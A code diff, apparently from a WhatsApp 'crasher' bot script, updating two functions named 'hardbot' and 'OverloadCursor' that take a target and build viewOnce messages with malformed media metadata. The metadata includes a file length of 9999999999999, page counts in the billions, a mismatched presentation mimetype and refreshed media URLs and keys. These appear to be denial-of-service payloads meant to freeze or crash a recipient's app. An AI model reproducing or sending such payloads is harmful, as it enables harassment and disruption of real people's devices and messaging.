@@ -2528,16 +2528,18 @@ async function hardbot(target) {
             viewOnceMessage: {
                 message: {
                     videoMessage: {
-                        url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
-											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-											fileLength: "9999999999999",
-											pageCount: 19316134911,
-											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-											fileName: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
-											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
-											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
-											mediaKeyTimestamp: "1724474503",
+                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
+                  mimetype:
+                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
+                  fileLength: "9999999999999",
+                  pageCount: 3567587327,
+                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
+                  fileName: "XP",
+                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
+                  directPath:
+                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
+                  mediaKeyTimestamp: "1735456100",
                         jpegThumbnail: tdxlol,
                         viewOnce: true
                     }
@@ -2656,9 +2658,9 @@ async function OverloadCursor(target, ptcp = true) {
                     "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                   fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                   fileLength: "9999999999999",
-                  pageCount: 39567587327,
+                  pageCount: 3567587327,
                   mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
-                  fileName: " 🦠⃟͒  ⃨⃨⃨𝐅𝐋𝐎𝐈𝐃˵𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑 ヶ⃔͒⃰   ",
+                  fileName: "XP",
                   fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                   directPath:
                     "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
